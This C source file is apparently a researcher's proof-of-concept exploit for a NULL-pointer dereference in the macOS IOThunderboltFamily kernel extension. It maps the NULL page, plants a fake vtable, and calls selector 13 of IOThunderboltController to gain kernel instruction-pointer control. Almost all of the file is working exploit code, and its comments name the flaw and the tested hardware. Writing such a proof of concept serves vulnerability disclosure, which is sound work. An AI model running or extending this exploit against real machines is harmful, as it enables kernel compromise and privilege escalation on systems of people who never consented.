// clang -o thunderbolt_request thunderbolt_request.c -m32 -framework IOKit

// IOThunderboltFamilyUserClient::xDomainRequestAction doesn't verify that a pointer is non-NULL
// before calling a virtual function, giving trivial kernel RIP control if the user process maps
// the NULL page, as this PoC demonstrates.

// IOThunderboltFamilyUserClient::xDomainRequestAction is called by
// IOThunderboltFamilyUserClient::xDomainRequest which is selector 13 of IOThunderboltController

// tested on MacBookAir5,2

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <mach/mach.h>
#include <mach/vm_map.h>

#include <IOKit/IOKitLib.h>

int main(int argc, char** argv){
  vm_deallocate(mach_task_self(), 0x0, 0x1000);
  vm_address_t addr = 0;
  vm_allocate(mach_task_self(), &addr, 0x1000, 0);
  char* np = 0;
  for (int i = 0; i < 0x1000; i++){
    np[i] = 'A';
  }

  // allocate a vtable elsewhere, to demonstrate that we survive the NULL dereference:
  char* vtable = malloc(0x1000);
  *((uint64_t*)(vtable + 0x458)) = 0xffffff8012345678;

  volatile uint64_t* null_pointer = 0;
  *null_pointer = (uint64_t)vtable;

  kern_return_t err;

  CFMutableDictionaryRef matching = IOServiceMatching("IOThunderboltController");
  if(!matching){
   printf("unable to create service matching dictionary\n");
   return 0;
  }

  io_iterator_t iterator;
  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
  if (err != KERN_SUCCESS){
   printf("no matches\n");
   return 0;
  }

  io_service_t service = IOIteratorNext(iterator);
  
  if (service == IO_OBJECT_NULL){
   printf("unable to find service\n");
   return 0;
  }
  printf("got service: %x\n", service);

  io_connect_t conn = MACH_PORT_NULL;
  err = IOServiceOpen(service, mach_task_self(), 0, &conn);
  if (err != KERN_SUCCESS){
   printf("unable to get user client connection\n");
   return 0;
  }

  printf("got userclient connection: %x\n", conn);

  uint64_t inputScalar[16];  
  uint64_t inputScalarCnt = 0;

  char inputStruct[4096];
  size_t inputStructCnt = 0;

  uint64_t outputScalar[16];
  uint32_t outputScalarCnt = 0;

  char outputStruct[4096];
  size_t outputStructCnt = 0;

  inputScalarCnt = 0;
  inputStructCnt = 0;

  outputScalarCnt = 0;
  outputStructCnt = 0;

  err = IOConnectCallMethod(
   conn,
   13,
   inputScalar,
   inputScalarCnt,
   inputStruct,
   inputStructCnt,
   outputScalar,
   &outputScalarCnt,
   outputStruct,
   &outputStructCnt); 

  if (err != KERN_SUCCESS){
   printf("IOConnectCall error: %x\n", err);
   return 0;
  }
}
